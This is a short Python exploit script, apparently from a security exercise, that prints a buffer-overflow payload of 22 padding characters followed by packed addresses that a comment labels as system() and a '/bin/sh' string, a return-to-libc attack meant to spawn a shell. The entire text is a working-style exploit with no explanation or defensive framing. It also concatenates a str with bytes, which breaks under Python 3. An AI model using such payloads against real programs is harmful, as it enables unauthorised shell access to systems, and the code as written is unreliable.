from shellcode import shellcode
from struct import pack

# find &system,+9999999,"/bin/sh"
print("0" * 22 + pack("<I", 0x08048f21) + pack("<I", 0x80c61c5))
